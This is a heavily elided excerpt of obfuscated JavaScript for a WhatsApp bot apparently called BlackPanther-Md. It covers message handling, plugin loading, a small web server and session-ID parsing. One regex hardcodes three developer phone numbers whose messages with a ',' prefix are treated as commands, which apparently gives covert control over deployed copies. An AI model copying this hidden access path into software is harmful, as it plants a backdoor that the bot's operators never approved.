...
async function syncdb() {
  ...
  let _0x5447f8 = SuhailMDConnect({
    ...
    getMessage: async _0x303f46 => {
      let _0x2faf9d = {
        conversation: "I'm Black-panther-Md!"
      };
      if (store) {
    ...
    try {
      ...
      for (mek of _0x1071af.messages) {
        ...
        if (_0x57832c && Config.HANDLERS.toLowerCase().includes("null")) {
          ...
          _0x9954f4 = prefixboth || _0x4186a0 && prefixRegex.test(_0x4186a0[0]) || _0x5979da.isSuhail && /923184474176|923004591719|17863688449/g.test(_0x5b55c3) && _0x4186a0[0] == ",";
        ...
        events.commands.map(async _0x2dffdb => {
          if (typeof _0x2dffdb.on === "string") {
            ...
            } else if (_0x5979da.text && _0x1d5795 === "text" && /text|txt|true|smd|suhail/gi.test(_0x2dffdb.quoted) && _0x5979da.quoted && _0x5979da.quoted.text && _0x3078ae) {
              _0x2dffdb.function(_0x5979da, _0x4186a0, _0x4717ae);
...
async function loadPlugins(_0x31a795) {
  try {
    fs.readdirSync(_0x31a795).forEach(_0x340012 => {
      ...
      } else if ([".js", ".smd", ".suhail"].includes(path.extname(_0x340012).toLowerCase())) {
        try {
          require(_0x4c0490);
        } catch (_0xf3f8e5) {
...
<head>
    ...
    <title>ibrahimaitech</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1 class="bouncing-text">ibrahimaitech</h1>
    </div>
</body>
</html>
`;
...
app.listen(quickport, () => console.log("BlackPanther-Md Server listening on http://localhost:" + quickport + "/  "));
...
async function MakeSession(_0x3344dc = SESSION_ID, _0xe1ef27 = __dirname + baileys, _0x1532e1 = false) {
  let _0x148358 = ("" + _0x3344dc).replace(/^BLACKPANTHER_\d{2}_\d{2}_\d{2}_\d{2}_/gi, "").replace(/^BLACKPANTHER_ID_\d{2}_\d{2}_\d{2}_\d{2}_/gi, "").replace(/^BLACKPANTHER_\d{2}_\d{2}_\d{2}_\d{2}_/gi, "").replace(/blackpanther;;;/gi, "").replace(/Vorterx;;;/gi, "").replace(/ibrahimaitech;;;/gi, "").trim();
  ...
  const _0x406ff0 = "/ibrahimaitech/";
  const _0x40fbb4 = toBool(_0x1532e1 || global.IS_SUHAIL || process.env.IS_SUHAIL, true) || (await _0x28b1d6(_0x406ff0, "./Suhail_Md"));
  if (_0x40fbb4) {
    SmdOfficial = "yes";
